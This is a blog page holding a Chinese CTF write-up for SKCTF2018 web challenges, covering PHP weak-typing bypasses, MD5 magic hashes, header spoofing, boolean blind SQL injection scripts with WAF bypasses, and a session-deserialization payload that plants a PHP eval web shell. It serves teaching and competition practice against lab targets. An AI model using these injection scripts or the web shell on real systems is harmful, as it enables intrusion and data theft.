@@ -1,0 +1,2053 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SKCTF2018 WriteUp, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SKCTF2018 WriteUp | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SKCTF2018 WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2018-05-07
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-02-16
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    7.8k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <hr>
+<blockquote>
+<p>SKCTF2018 WriteUp</p>
+<p>山东科技大学网络安全小组</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Wait-a-minute"><a href="#Wait-a-minute" class="headerlink" title="Wait_a_minute"></a>Wait_a_minute</h2><p>右键查看源代码，发现源码。</p>
+<pre><code class="php">&lt;html&gt;
+&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&lt;!--
+
+if(isset($_POST[&#39;password&#39;]))
+&#123;
+    if(strcmp($_POST[&#39;password&#39;],$password)==0)&#123;
+        echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;
+        if(isset($_GET[&#39;time&#39;]))&#123;
+                $t=$_GET[&#39;time&#39;];
+                if(!is_numeric($t))&#123;
+                        echo &#39;Sorry.&lt;br&gt;&#39;;
+                &#125;else if($t &lt; 66 * 55 * 44 * 33 * 22 * 11 )&#123;
+                                echo &#39;you need a bigger time.&lt;br&gt;&#39;;
+                &#125;else if($t &gt; 11 * 23 * 33 * 44 * 55 * 66)&#123;
+                                echo &#39;you need a smaller time.&lt;br&gt;&#39;;
+                &#125;else&#123;
+                        sleep((int)$t);
+                        var_dump($flag);
+                &#125;
+                        echo &#39;&lt;hr&gt;&#39;;
+        &#125;
+    &#125;else&#123;
+        echo &quot;Password is wrong............&lt;br&gt;&quot;;
+    &#125;
+&#125;else&#123;
+    echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;
+&#125;
+--!&gt;
+
+
+
+&lt;/html&gt;</code></pre>
+<p>首先要求post一个password，要求与服务端设定的password相等才能继续，而这次用了双等号==比较，存在弱</p>
+<p>类型绕过。Post一个数组即可</p>
+<p><img src="/images/SKCTF2018/waitamin1.png" alt="waitamin1"></p>
+<p>继续发现需要传入一个time时间。在sleep这些时间后会输出这个时间，而在源码中可以可以看到时间的大小在66 </p>
+<p>55 * 44 * 33 * 22 * 11-11 * 23 * 33 * 44 * 55 * 66之间，也就是说只要等上个几百天flag就出来了。简单吧。</p>
+<p>Ok，我们当然不能等上几百天，在源码中可以看到.</p>
+<p><img src="/images/SKCTF2018/waitamin2.png" alt="waitamin2"></p>
+<p>对时间t做了int强制转换，那么我们的机会来了。可以使用十六进制，绕过前边的时间检测，而十六进制以0x开</p>
+<p>头，int转换后就是0，那么就可以得到flag了。</p>
+<p><img src="/images/SKCTF2018/waitamin3.png" alt="waitamin3"></p>
+<h2 id="Php-string"><a href="#Php-string" class="headerlink" title="Php_string"></a>Php_string</h2><p>题目存在源码泄露，访问 .index.php.swp</p>
+<p>使用vim -r命令恢复</p>
+<p>可以得到题目源码</p>
+<p><img src="/images/SKCTF2018/phpstring1.png" alt="phpstring1"></p>
+<p>可以看到得到flag的条件很简单，只要输入的id等于字符串‘6666‘即可，但是这里challenge函数对id进行了过滤，无法通过单双引号等方式传入字符串，百度一下可以发现php还有其他一些表示字符串的方式，可以找到一种heredoc的方式，而且佩奇图片的名字就是heredoc，这里其实也给了一些提示。</p>
+<p>那么我们就可以用heredoc语法构造payload</p>
+<pre><code class="php">Id=&lt;&lt;&lt;b
+
+6666
+
+ b;</code></pre>
+<p>而需要注意的事，这里有三个换行，其中最后的分号后也需要换行，可以使用%oa代替</p>
+<p>那么最终的payload :</p>
+<pre><code class="php">?id=&lt;&lt;&lt;b%0a6666%0ab;%0a</code></pre>
+<p><img src="/images/SKCTF2018/phpstring2.png" alt="phpstring2"></p>
+<h2 id="八大关"><a href="#八大关" class="headerlink" title="八大关"></a>八大关</h2><pre><code>一些简单知识点的汇总</code></pre>
+<h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p>查看源代码，可以在注释中看到提示：</p>
+<pre><code>你不是自己人，我不能让你进去！
+&lt;!-- 悄悄告诉你，我们自己人的ip都是233.233.233.233 --&gt;</code></pre>
+<p>可以知道这题限制了IP，我们利用X-Forwarded-For来伪造请求IP。</p>
+<blockquote>
+<p><strong>X-Forwarded-For</strong>（<strong>XFF</strong>）是用来识别通过<a href="https://www.wikiwand.com/zh-hans/HTTP" target="_blank" rel="noopener">HTTP</a><a href="https://www.wikiwand.com/zh-hans/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">代理</a>或<a href="https://www.wikiwand.com/zh-hans/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1" target="_blank" rel="noopener">负载均衡</a>方式连接到<a href="https://www.wikiwand.com/zh-hans/Web%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">Web服务器</a>的客户端最原始的<a href="https://www.wikiwand.com/zh-hans/IP%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">IP地址</a>的HTTP请求头字段</p>
+</blockquote>
+<p>我们通过burpsuite来添加编辑X-Forwarded-For的值来伪造ip，成功通关。</p>
+<h3 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h3><p>页面上的提示点明了我们要使用OS X 99 系统来访问，通过更改UA来通关。</p>
+<blockquote>
+<p>You should use “Mac OS X 99” to through the door!</p>
+</blockquote>
+<p>通过burpsuite将headers中的user-agent更改为题目要求的即可通关。</p>
+<blockquote>
+<p><strong>User-Agent</strong> 首部包含了一个特征字符串，用来让网络协议的对端来识别发起请求的用户代理软件的应用类型、操作系统、软件开发商以及版本号。</p>
+</blockquote>
+<h3 id="Challenge2"><a href="#Challenge2" class="headerlink" title="Challenge2"></a>Challenge2</h3><p>给出了关键代码：</p>
+<pre><code>if($_POST[&quot;a&quot;] != $_POST[&quot;b&quot;] &amp;&amp; md5($_POST[&quot;a&quot;]) == md5($_POST[&quot;b&quot;]))&#123;
+success!
+&#125;</code></pre>
+<p>payload：a=240610708,b=QLTHNDT（不唯一）</p>
+<p><code>==</code>在进行比较的时候，会先将字符串类型转化成相同，再比较。如果一个字符串和数字进行比较会先将字符串进行类型转换成数值进行比较。0e开头加数字组成的字符串在比较时，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。也就是只要是a，b的值经过md5加密后符合这种格式就能成功。</p>
+<table>
+<thead>
+<tr>
+<th align="center">a/b</th>
+<th align="center">Md5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">240610708</td>
+<td align="center">0e462097431906509019562988736854</td>
+</tr>
+<tr>
+<td align="center">QLTHNDT</td>
+<td align="center">0e405967825401955372549139051580</td>
+</tr>
+</tbody></table>
+<h3 id="Challenge3"><a href="#Challenge3" class="headerlink" title="Challenge3"></a>Challenge3</h3><p>给出了关键代码：</p>
+<pre><code>if(($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;])===md5($_GET[&#39;b&#39;]))&#123;
+    success!;
+        &#125;</code></pre>
+<p>要求两个参数的值不相等，且a===b，两个md5的强等于比较，我们使用数组来绕过。</p>
+<p>Payload:<code>challenge3.php?a[]=1&amp;b[]=2</code></p>
+<p>md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等。</p>
+<h3 id="Challenge4"><a href="#Challenge4" class="headerlink" title="Challenge4"></a>Challenge4</h3><p>根据给出的提示，很显然是要爆破md5.已经提示了是纯数字进行的加密，所以爆破很容易。</p>
+<pre><code>substr(md5(input),0,6) ===b04f51</code></pre>
+<p>md5爆破：</p>
+<pre><code class="python">import hashlib
+
+def getmd5(code):
+    for i in range(999999):
+        temp = hashlib.md5(str(i)).hexdigest()
+        if temp[0:6] == code:
+            return i 
+
+if __name__ == &#39;__main__&#39;:
+    print getmd5(&#39;b04f51&#39;)
+
+#587478</code></pre>
+<h3 id="Challenge5"><a href="#Challenge5" class="headerlink" title="Challenge5"></a>Challenge5</h3><p>给出了关键代码，通过strcmp函数来比较两个参数，通过数组绕过。</p>
+<pre><code>if(!strcmp($_POST[&#39;a&#39;],$_POST[&#39;b&#39;]))&#123;
+success!
+&#125;</code></pre>
+<p>payload：<code>/challeneg5.php?a[]=1&amp;b=123</code></p>
+<p>strcmp()是比较两个字符串是否相等的函数， 他的判断原理是先将两个字符串转换成ascii然后进行减法运算，结果和0比较， 如果str1&lt;str2 则返回&lt;0，如果str1大于str2返回&gt;0 如果两者相等 返回0 所以它是对字符串类型进行的操作，如果传入数组呢。结果是null但是与0进行松散比较结果是true的。</p>
+<p><img src="http://omfp4wyym.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-14%20%E4%B8%8B%E5%8D%881.42.20.png" alt="松散比较"></p>
+<h3 id="Challenge6"><a href="#Challenge6" class="headerlink" title="Challenge6"></a>Challenge6</h3><p>关键代码已给出,要求参数不能是SKCTF且经过urldecode后等于SKCTF，因为会自动进行一次urldecode，所以将SKCTF进行hex编码两次。</p>
+<pre><code>if(eregi(&quot;SKCTF&quot;,$_GET[&#39;code&#39;])) &#123;    
+echo(&quot;code error!&quot;);    
+exit();    
+&#125;    
+
+$_GET[&#39;code&#39;] = urldecode($_GET[&#39;code&#39;]);    
+if($_GET[&#39;code&#39;] == &quot;SKCTF&quot;)    
+&#123;    
+success;    
+&#125;    </code></pre>
+<p>Payload:</p>
+<pre><code>/?code=%25%35%33%25%34%62%25%34%33%25%35%34%25%34%36</code></pre>
+<h3 id="Lastchallenge"><a href="#Lastchallenge" class="headerlink" title="Lastchallenge"></a>Lastchallenge</h3><p>检查元素能看到密码锁的js代码，js验证密码所以要么改js要么直接输入密码，通关。</p>
+<pre><code class="javascript">var Lock = function () &#123;
+  function Lock() &#123;
+    _classCallCheck(this, Lock);
+
+    this.pin = &#39;7982&#39;;
+    this.setupDom();
+    this.setupFlickity();
+    this.setupAudio();
+    this.onResize();
+    this.listen();
+  &#125;</code></pre>
+<p>得到flag：SKCTF{haHA_EZ_D0oR}</p>
+<h2 id="login-me"><a href="#login-me" class="headerlink" title="login me"></a>login me</h2><p>这题考察sql bool盲注，难点在于waf的绕过。</p>
+<p>这里直接给出源码的waf</p>
+<pre><code class="php">$waf=&quot;union|if| |=|and|&gt;|&lt;|or|substr|mid|left|right|like|regexp&quot;;</code></pre>
+<p>具体黑盒测试时可以用burpsuite中的intruder工具构建字典自行fuzz。</p>
+<p>waf中的空格用<code>/**/</code>绕过，<code>=</code>用<code>in</code>代替，<code>lpad</code>函数用来截取字符串。</p>
+<p>题目还有sql数据库结构泄露，直接访问web4.sql可以看到数据库的结构。</p>
+<p>payload：<code>username=1&#39;/**/||/**/lpad((&#39;a&#39;),1,1)/**/in/**/(&#39;a&#39;)#&amp;password=123</code></p>
+<p>接下来就可以直接盲注查表了。</p>
+<pre><code class="python">#-*-coding:utf-8-*-
+
+import requests 
+import time
+
+url = &#39;http://192.168.211.131:49154/&#39; 
+
+def check(payload):
+    postdata=&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;
+    r = requests.post(url,postdata).content
+    #print r
+    return &#39;Wrong password&#39; in r
+
+flag=&#39;&#39;
+s = r&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;&#39;
+for i in xrange(1,64):    
+    for c in s:        
+        payload = &#39;1\&#39;/**/||/**/lpad((select/**/f14g/**/from/**/f1ag),%s,1)/**/in/**/(\&#39;%s\&#39;)#&#39;%(str(i),flag+c)     
+        #print payload
+        if check(payload):
+            flag += c
+            break
+    print flag
+    if &#39;&#125;&#39; in flag:
+        break    </code></pre>
+<h2 id="绕啊绕"><a href="#绕啊绕" class="headerlink" title="绕啊绕"></a>绕啊绕</h2><hr>
+<p>给了关键代码，先一句一句分析代码，一步步绕过条件：</p>
+<pre><code>$rule = &#39;/([[:punct:]]+|[[:alpha:]]+|[[:digit:]]+)/&#39;;</code></pre>
+<p>这句是规定了一个rule参数，如果了解php的可以知道，PHP的正则表达式有一些内置的通用字符簇，<code>[[:punct:]]</code>代表了任何标点符号，<code>[[:alpha:]]</code>代表了任何字母，不区分大小写，<code>[[:digit:]]</code>代表了任何数字，接着读代码：</p>
+<pre><code>if (8 &gt; preg_match_all($rule, $data, $arr))</code></pre>
+<p>这个条件是必须要满足的，否则会break掉，要绕过preg_match_all这个正则表达式，我们必须在data中匹配到八次以上的rule条件，也就是标点符号，数字，字母，接着读代码：</p>
+<pre><code>$nn = array(&#39;punct&#39;, &#39;alpha&#39;, &#39;digit&#39;);
+        foreach ($nn as $ns)
+        &#123; 
+            if (preg_match(&quot;/[[:$ns:]]+/&quot;, $data))
+            &#123;
+                $num += 1;
+            &#125;
+        &#125;
+        if ($num &lt; 3)
+            break;
+        if (187667123 == $data)
+        &#123;
+            $da = $_GET[&#39;num&#39;];
+            if (!is_numeric($da))
+            &#123;
+                if(27500 &lt; $da)
+                &#123;
+                    echo $flag;
+                &#125;</code></pre>
+<p>重要代码就到这结束了，仔细读一下也不难，foreach是一个循环，同样是一个正则表达式preg_match，这段代码的意思是，你要使得data中的数据匹配到超过三次，num才能不&lt;3，也就是要出现超过三种以上的数据，因为代码里规定的数据只有三种，也就是字母，数字，标点符号，所以也就是要这三种数据都出现在payload中才能满足条件，那有的同学会问了，这个条件和之前那个正则表达式有什么区别呢，之前那个要求出现八次以上，但是并不要求三种数据都出现，这里要求的是三种都出现，而且要求数字等于187667123，下一个条件是：</p>
+<pre><code>if (!is_numeric($da))
+            &#123;
+                if(27500 &lt; $da)</code></pre>
+<p>get一个num参数，is_numeric函数是判断一个参数是不是数字，而且还要求比27500大，这个函数是判断一个参数是不是数字，那么如果穿进去的参数是一个字符串就会返回0，绕过，然后要求比27500大，这就是php的弱类型，如果你传输的参数为27501a，那么强制转换后比较的数字就是27501，比27500大，也绕过，然后得到flag，最终payload为：</p>
+<pre><code>url=http://127.0.0.1/other.php?num=27501a
+POST=data=187667123.0e+0-0+0</code></pre>
+<p>答案多样化，大家随意发挥。</p>
+<h2 id="login-me-easy-edition"><a href="#login-me-easy-edition" class="headerlink" title="login me[easy edition]"></a>login me[easy edition]</h2><p>这题考察sql bool盲注，几乎没有waf。</p>
+<p>payload：<code>username=admin&#39; and substr((select f14g from f1ag),1,1)=&#39;S&#39;#&amp;password=123</code></p>
+<p>接下来就可以直接盲注查表了。</p>
+<pre><code class="python">#-*-coding:utf-8-*-
+
+import requests 
+import time
+
+url = &#39;http://192.168.211.131:49157/&#39; 
+
+def check(payload):
+    postdata=&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;
+    r = requests.post(url,postdata).content
+    #print r
+    return &#39;Wrong password&#39; in r
+
+flag=&#39;&#39;
+s = r&#39;SKCTF&#123;&#125;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#39;
+for i in xrange(1,64):    
+    for c in s:        
+        payload = &#39;admin\&#39; and substr((select f14g from f1ag),%s,1)=\&#39;%s\&#39;#&#39;%(str(i),c)     
+        #print payload
+        if check(payload):
+            flag += c
+            break
+    print flag
+    if &#39;&#125;&#39; in flag:
+        break        </code></pre>
+<p>sqlmap -r 也能跑出来</p>
+<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><h3 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h3><ul>
+<li>源代码泄露</li>
+<li>善于使用搜索引擎</li>
+</ul>
+<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>由源代码泄露可以知道有三个文件<br>index.php</p>
+<pre><code>&lt;?php
+
+ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
+session_start();
+echo rand();
+if(isset($_POST[&#39;up_addr&#39;]))
+&#123;
+    include(&quot;rand_addr.php&quot;);
+    if($_POST[&#39;up_addr&#39;]===$up_addr&amp;&amp;isset($_POST[&#39;str&#39;]))
+    &#123;
+        $str = $_POST[&#39;str&#39;];
+        $_SESSION[&#39;name&#39;] = $str;
+    &#125;
+
+&#125;
+</code></pre>
+<p>kkkk.php</p>
+<pre><code>&lt;?php
+
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+class  SKCTF&#123;
+    var $content;
+    function __destruct() &#123;
+        include(&quot;rand_addr.php&quot;);
+        file_put_contents(&quot;/var/www/html/upload/$up_addr.php&quot;,$this-&gt;content);
+    &#125;
+&#125;
+</code></pre>
+<p>rand_addr.php</p>
+<pre><code>&lt;?php
+$up_addr = str_shuffle(&#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;);</code></pre>
+<p>代码逻辑很简单，明显预测随机字符串，预测出来判断正确之后有个存储session的操作，然后可以发现两个文件对session的操作方式不一样，导致了session反序列化的产生。</p>
+<p>分析<code>str_shuffle</code>函数的底层代码</p>
+<pre><code>static void php_string_shuffle(char *str, long len TSRMLS_DC) /* &#123;&#123;&#123; */
+&#123;
+    long n_elems, rnd_idx, n_left;
+    char temp;
+    /* The implementation is stolen from array_data_shuffle       */
+    /* Thus the characteristics of the randomization are the same */
+    n_elems = len;
+
+    if (n_elems &lt;= 1) &#123;
+        return;
+    &#125;
+
+    n_left = n_elems;
+
+    while (--n_left) &#123;
+        rnd_idx = php_rand(TSRMLS_C);
+        RAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);
+        if (rnd_idx != n_left) &#123;
+            temp = str[n_left];
+            str[n_left] = str[rnd_idx];
+            str[rnd_idx] = temp;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>可以知道<code>str_shuffle</code>是通过获取rand值来打乱字符串的，根据传进来的字符串值的长度决定了调用获取rand的次数，那么参考文章</p>
+<pre><code>http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</code></pre>
+<p>可以知道rand()值是可以预测的，看一下RAND_RANGE的实现</p>
+<pre><code>#define RAND_RANGE(__n, __min, __max, __tmax) \
+(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</code></pre>
+<p>那么既然rand可以预测的话，打乱后的字符串也可以预测。</p>
+<p>假如这里预测了字符串还考察了session反序列化<br>构造反序列化的payload</p>
+<pre><code>&lt;?php
+
+class  SKCTF&#123;
+    var $content;
+&#125;
+$p0desta = new SKCTF();
+$p0desta-&gt;content = &quot;&lt;?php eval(\$_POST[1]); ?&gt;&quot;;
+echo &quot;|&quot;.serialize($p0desta);</code></pre>
